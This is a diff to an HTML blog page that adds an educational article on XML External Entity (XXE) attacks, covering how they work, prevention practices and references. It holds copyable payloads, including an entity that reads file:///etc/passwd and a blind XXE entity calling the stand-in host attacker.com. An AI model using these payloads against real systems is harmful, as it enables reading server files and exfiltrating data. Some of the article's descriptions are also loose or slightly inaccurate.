@@ -1,8 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
-
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -23,6 +21,8 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
     <link rel="stylesheet" href="https://kit.fontawesome.com/997d814be9.css" crossorigin="anonymous">
     <link href="https://getbootstrap.com/docs/5.2/assets/css/docs.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-okaidia.min.css" rel="stylesheet" />
+ 
 
     <link href="css/style.css" rel="stylesheet">
 
@@ -30,6 +30,8 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://kit.fontawesome.com/997d814be9.js" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+    
 
     <!-- <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -55,7 +57,7 @@
 
     <style>
         body {
-            background: #1b1a1c;
+            background: #130a3f;
             font-family: 'Open Sans', Helvetica, sans-serif;
             color: #7E7E7E;
         }
@@ -99,6 +101,25 @@
             font-family: "inter", sans-serif;
             font-size: 32px;
         }
+
+        /* blog styling */
+        .blog h2 {
+            font-weight: 400;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            color: #08a0e9;
+        }
+        .content p {
+            color: #ffff;
+        }
+
+        .copy-code {
+            position: absolute;
+        /*  top: 0; */
+        /*  right: 0; */
+            cursor: pointer;
+        }
+
 
         /* socials and copyright */
         .socials-copyright {
@@ -157,6 +178,10 @@
             font-size: small;
         }
 
+        .blog li {
+            color: #fff;
+        }
+
        
         @media screen and (max-width: 780px) {
             .contact-container {
@@ -194,42 +219,131 @@
         </div>
     </section>
 
-    
     <article class="blog">
         <div class="caption">
             <time datetime="2023-03-12">Sunday, March 12, 2023</time>
             <h1>XXE Attack: A Guide to Understanding and Prevention</h1>
         </div>
-        
+    
         <div class="content">
             <p>
-                XML External Entity (XXE) Attack is a type of security vulnerability that can allow attackers to steal sensitive information or execute arbitrary code. 
-                It is a relatively old attack technique, but it is still relevant today, as it can be found in many modern web applications. 
+                XML External Entity (XXE) Attack is a type of security vulnerability that can allow attackers to steal
+                sensitive information or execute arbitrary code.
+                It is a relatively old attack technique, but it is still relevant today, as it can be found in many modern
+                web applications.
                 In this article, we will explore what XXE attacks are, how they work, and how to prevent them.
             </p>
             <h2>What is XXE Attack?</h2>
             <p>
-                XML External Entity (XXE) Attack is a type of attack that exploits the XML parser’s ability to process external entities. 
-                An XML external entity is a reference to an external XML document that is included within an XML document. 
-                The external entity can be defined within the same document or in a separate document. 
-                In XXE attack, an attacker can use an external entity to reference sensitive files or resources on the web server.
+                XML External Entity (XXE) Attack is a type of attack that exploits the XML parser’s ability to process
+                external entities.
+                An XML external entity is a reference to an external XML document that is included within an XML document.
+                The external entity can be defined within the same document or in a separate document.
+                In XXE attack, an attacker can use an external entity to reference sensitive files or resources on the web
+                server.
             </p>
-
+    
             <h2>How does XXE Attack Work?</h2>
             <p>
-                XXE Attack works by injecting specially crafted XML input into an application that parses XML input. 
-                The attacker can then use the external entity to reference sensitive files or resources on the web server. 
-                For example, an attacker may use an external entity to reference the /etc/passwd file on a Linux server, which contains sensitive information such as usernames and hashed passwords.
+                XXE Attack works by injecting specially crafted XML input into an application that parses XML input.
+                The attacker can then use the external entity to reference sensitive files or resources on the web server.
+                For example, an attacker may use an external entity to reference the /etc/passwd file on a Linux server,
+                which contains sensitive information such as usernames and hashed passwords.
             </p>
             <p>
-                An attacker may also use an external entity to perform a Denial of Service (DoS) attack by referencing an external resource 
-                that does not exist or is too large for the server to handle. This can cause the server to crash or become unresponsive.
+                An attacker may also use an external entity to perform a Denial of Service (DoS) attack by referencing an
+                external resource
+                that does not exist or is too large for the server to handle. This can cause the server to crash or become
+                unresponsive.
+            </p>
+    
+            <h2>XXE Attack Payloads</h2>
+            <p>
+                There are several payloads that an attacker can use to exploit the XXE vulnerability. Here are some
+                examples:
+            </p>
+            <ul>
+                <li>
+                    Internal Entity Declaration Payload: This payload defines an internal entity that contains sensitive data, which can then be accessed using an external entity.
+                </li>
+                <div class="code-snippet">
+                    <div class="copy-code">&#x1F4CB;</div>
+                    <pre><code class="language-xml" data-clipboard-text='<!DOCTYPE replace [<!ENTITY example "Sensitive Data"> ]>
+                    <root>&example;</root>'>
+                        &lt;!DOCTYPE replace [&lt;!ENTITY example "Sensitive Data"&gt; ]&gt;
+                        &lt;root&gt;&amp;example;&lt;/root&gt;
+                    </code></pre>
+                </div>
+
+                <li>
+                    External Entity Declaration Payload: This payload defines an external entity that references a sensitive file or resource on the web server.
+                </li>
+                <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-xml" data-clipboard-text='<!DOCTYPE replace [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>
+                <root>&example;</root>'>
+                    &lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM "file:///etc/passwd"&gt; ]&gt;
+                    &lt;root&gt;&amp;example;&lt;/root&gt;
+                </code></pre>
+                </div>
+
+                <li>
+                    Blind XXE Injection Payload: This payload does not return any output to the attacker, but it can be used to verify if the application is vulnerable to XXE attacks.
+                </li>
+                <div class="code-snippet">
+                <div class="copy-code">&#x1F4CB;</div>
+                <pre><code class="language-xml" data-clipboard-text='<!DOCTYPE replace [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe"> %xxe; ]>'>
+                &lt;!DOCTYPE replace [&lt;!ENTITY % xxe SYSTEM "http://attacker.com/xxe"&gt %xxe; ]&gt;
+                </code></pre>
+                </div>
+
+            </ul>
+
+            <h2>Prevention of XXE Attack</h2>
+
+            <p>The following are some best practices for preventing XXE attacks:</p>
+
+            <ul>
+                <li>
+                    <b>Disable External Entities:</b> Disabling external entities can prevent XXE attacks. 
+                    This can be achieved by setting the "external-general-entities" and "external-parameter-entities" features of the XML parser to false.
+                </li>
+                <li>
+                    <b>Input Validation:</b> Validating user input can prevent XXE attacks. Applications should validate user input and reject any input that contains XML external entities.
+                </li>
+                <li>
+                    <b>Use Whitelisting:</b> Whitelisting can be used to allow only a specific set of XML elements and attributes to be parsed by the XML parser.
+                </li>
+                <li>
+                    <b>Use XML Parsers with Built-in Protection:</b> Using XML parsers with built-in protection against XXE attacks can prevent XXE attacks. 
+                    Some examples of such parsers are Microsoft’s .NET Framework, Apache Xerces, and OWASP ESAPI.
+                </li>
+            </ul>
+
+            <h2>Conclusion</h2>
+            
+            <p>In conclusion, XXE Attack is a type of security vulnerability that can allow attackers to steal sensitive information or execute arbitrary code. 
+               It is important for developers to understand how XXE attacks work and how to prevent them. 
+               By implementing the best practices mentioned above, developers can secure their applications against XXE attacks and protect sensitive data from being compromised.
             </p>
 
-            <h2>XXE Attack Payloads</h2>
-            There are several payloads that an attacker can use to exploit the XXE vulnerability. Here are some examples:
+            <h2>References</h2>
+            <div class="reference">
+                <ul>
+                    <li>
+                        <a href="https://portswigger.net/web-security/xxe">XML external entity (XXE injection)</a>
+                    </li>
+                    <li>
+                        <a href="https://securityzines.com/flyers/xxe.html">Security Zines XXE</a>
+                    </li>
+                    <li>
+                        <a href="https://brightsec.com/blog/xxe-attack">XXE Attacks: Types, Code Examples, Detection and Prevention</a>
+                    </li>
+                </ul>
+            </div>
+
         </div>
-      
+    
     </article>
 
 
@@ -237,6 +351,8 @@
     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/popper.js@1.14.7/dist/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.3.1/dist/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script>hljs.highlightAll();</script>
 </body>
 </html>
